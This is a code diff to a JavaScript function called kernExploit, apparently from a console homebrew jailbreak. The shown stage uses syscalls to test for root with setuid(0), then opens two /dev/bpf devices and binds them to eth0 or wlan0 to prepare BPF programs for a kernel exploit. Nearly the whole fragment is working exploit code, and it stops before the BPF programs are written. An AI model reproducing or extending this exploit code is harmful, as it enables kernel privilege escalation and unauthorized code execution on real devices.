@@ -5,12 +5,49 @@ function kernExploit() {
     }
 
     // 1. We open /dev/bpf0 to acquire a reference to a bpf device
-    var fd = p.syscall("open", p.stringify("/dev/bpf0"), 2).low;
-    var fd1 = p.syscall("sys_open", stringify("/dev/bpf"), 2, 0); // 0666 permissions, open as O_RDWR
+    //alert("OHHH WE'RE HALFWAY THERE WOOOOOOAHHH LIVIN ON A PRAYER")
 
-    if(fd1 < 0) {
-      throw "Failed to open first /dev/bpf device!";
-    }
+    var test = p.syscall("sys_setuid", 0);
+
+    // Check if homebrew has already been enabled, if not, run kernel exploit :D
+    if(test != '0') {
+      /////////////////// STAGE 1: Setting Up Programs ///////////////////
+
+      var spadp = mallocu32(0x2000);
+
+      // Open first device and bind
+      var fd1 = p.syscall("sys_open", stringify("/dev/bpf"), 2, 0); // 0666 permissions, open as O_RDWR
+
+      if(fd1 < 0) {
+        throw "Failed to open first /dev/bpf device!";
+      }
+      
+      p.syscall("sys_ioctl", fd1, 0x8020426C, stringify("eth0")); // 8020426C = BIOCSETIF
+
+      if (p.syscall("sys_write", fd1, spadp, 40).low == (-1 >>> 0)) {
+        p.syscall("sys_ioctl", fd1, 0x8020426C, stringify("wlan0"));
+
+        if (p.syscall("sys_write", fd1, spadp, 40).low == (-1 >>> 0)) {
+          throw "Failed to bind to first /dev/bpf device!";
+        }
+      }
+
+      // Open second device and bind
+      var fd2 = p.syscall("sys_open", stringify("/dev/bpf"), 2, 0); // 0666 permissions, open as O_RDWR
+
+      if(fd2 < 0) {
+        throw "Failed to open second /dev/bpf device!";
+      }
+
+      p.syscall("sys_ioctl", fd2, 0x8020426C, stringify("eth0")); // 8020426C = BIOCSETIF
+
+      if (p.syscall("sys_write", fd2, spadp, 40).low == (-1 >>> 0)) {
+        p.syscall("sys_ioctl", fd2, 0x8020426C, stringify("wlan0"));
+
+        if (p.syscall("sys_write", fd2, spadp, 40).low == (-1 >>> 0)) {
+          throw "Failed to bind to second /dev/bpf device!";
+        }
+      }
 
     // Write BPF programs
     
